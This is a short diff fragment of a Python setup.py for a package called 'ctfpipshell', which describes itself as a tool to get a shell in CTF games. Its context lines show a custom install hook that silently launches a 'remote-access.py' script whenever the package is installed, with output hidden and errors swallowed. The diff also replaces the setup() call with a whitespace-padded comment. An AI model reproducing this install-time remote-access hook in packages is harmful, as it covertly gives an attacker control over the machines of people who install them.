@@ -26,19 +26,4 @@ class execute(install):
             subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
         except:
             pass
-setup(
-    name="ctfpipshell",
-    version="0.0.4",
-    author="laenix",
-    author_email="laenix120@gmail.com",
-    description="A package to get shell in ctf",
-    long_description=readme,
-    long_description_content_type="text/markdown",
-    url="https://github.com/laneix/ctf-pip-shell/",
-    packages=find_packages(),
-    install_requires=requirements,
-    classifiers=[
-	"Programming Language :: Python :: 3.9",
-	"License :: OSI Approved :: MIT License",
-    ],
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
